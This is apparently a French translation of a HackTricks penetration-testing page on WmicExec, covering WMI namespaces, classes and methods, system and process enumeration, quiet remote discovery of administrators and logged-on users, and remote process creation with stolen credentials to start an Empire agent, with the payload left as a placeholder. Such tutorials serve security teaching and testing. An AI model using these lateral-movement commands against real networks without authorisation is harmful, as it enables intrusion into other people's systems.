# WmicExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Comment ça marche

Wmi permet d'ouvrir un processus sur des hôtes où vous connaissez le nom d'utilisateur/(mot de passe/Hash). Ensuite, Wmiexec utilise wmi pour exécuter chaque commande demandée à exécuter (c'est pourquoi Wmicexec vous donne un shell semi-interactif).

**dcomexec.py :** Ce script donne un shell semi-interactif similaire à wmiexec.py, mais en utilisant différents points de terminaison DCOM (objet ShellBrowserWindow DCOM). Actuellement, il prend en charge les objets MMC20. Application, les fenêtres Shell et les fenêtres du navigateur Shell. (à partir de [ici](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Bases de WMI

### Espace de noms

WMI est divisé en une hiérarchie de style répertoire, le conteneur \root, avec d'autres répertoires sous \root. Ces "chemins de répertoire" sont appelés espaces de noms.\
Liste des espaces de noms :
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Listez les classes d'un espace de noms avec:
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Classes**

Le nom de classe WMI, par exemple win32\_process, est un point de départ pour toute action WMI. Nous avons toujours besoin de connaître le nom de la classe et l'espace de noms où elle se trouve.\
Listez les classes commençant par `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Appeler une classe:
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Méthodes

Les classes WMI ont une ou plusieurs fonctions qui peuvent être exécutées. Ces fonctions sont appelées méthodes.
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Énumération WMI

### Vérification du service WMI

Voici comment vérifier si le service WMI est en cours d'exécution :
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### Informations système
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### Informations sur les processus

#### WMIC

#### WMIC

WMIC (Windows Management Instrumentation Command-line) est un outil de ligne de commande qui permet d'interroger et de gérer les informations du système d'exploitation Windows. Il peut être utilisé pour obtenir des informations sur les processus en cours d'exécution sur une machine.

Pour obtenir des informations sur les processus en cours d'exécution sur une machine, vous pouvez utiliser la commande suivante :

```
wmic process list brief
```

Cette commande affichera une liste de tous les processus en cours d'exécution sur la machine, avec leur ID de processus (PID), leur nom et leur chemin d'accès.

Vous pouvez également utiliser la commande suivante pour obtenir des informations plus détaillées sur un processus spécifique :

```
wmic process where processid=<PID> get *
```

Remplacez `<PID>` par l'ID de processus du processus que vous souhaitez examiner. Cette commande affichera des informations telles que le nom du processus, le chemin d'accès, le PID, le nombre de threads, la taille de la mémoire, etc.

#### Tasklist

#### Tasklist

Tasklist est un autre outil de ligne de commande qui peut être utilisé pour obtenir des informations sur les processus en cours d'exécution sur une machine Windows. Pour afficher une liste de tous les processus en cours d'exécution sur la machine, utilisez la commande suivante :

```
tasklist
```

Cette commande affichera une liste de tous les processus en cours d'exécution sur la machine, avec leur nom, leur PID, leur utilisation de la mémoire et leur état.

Vous pouvez également utiliser la commande suivante pour obtenir des informations plus détaillées sur un processus spécifique :

```
tasklist /fi "pid eq <PID>" /v
```

Remplacez `<PID>` par l'ID de processus du processus que vous souhaitez examiner. Cette commande affichera des informations telles que le nom du processus, le PID, le nom de l'utilisateur qui a lancé le processus, la mémoire utilisée, etc.
```bash
Get-WmiObject win32_process | Select Name, Processid
```
Du point de vue d'un attaquant, WMI peut être très utile pour énumérer des informations sensibles sur un système ou sur le domaine.
```
wmic computerystem list full /format:list  
wmic process list /format:list  
wmic ntdomain list /format:list  
wmic useraccount list /format:list  
wmic group list /format:list  
wmic sysaccount list /format:list  
```

```bash
 Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **Interrogation manuelle à distance de WMI**

Par exemple, voici une méthode très discrète pour découvrir les administrateurs locaux sur une machine distante (notez que le domaine est le nom de l'ordinateur):
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
```
Un autre oneliner utile consiste à voir qui est connecté à une machine (lorsque vous recherchez des administrateurs):
```
wmic /node:ordws01 path win32_loggedonuser get antecedent  
```
`wmic` peut même lire des nœuds à partir d'un fichier texte et exécuter la commande sur tous. Si vous avez un fichier texte de postes de travail :
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent  
```
Nous allons créer à distance un processus via WMI pour exécuter un agent Empire :
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
```
Nous voyons qu'il s'exécute avec succès (ReturnValue = 0). Et une seconde plus tard, notre écouteur Empire le capture. Notez que l'ID de processus est le même que celui renvoyé par WMI.

Toutes ces informations ont été extraites d'ici: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au repo [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
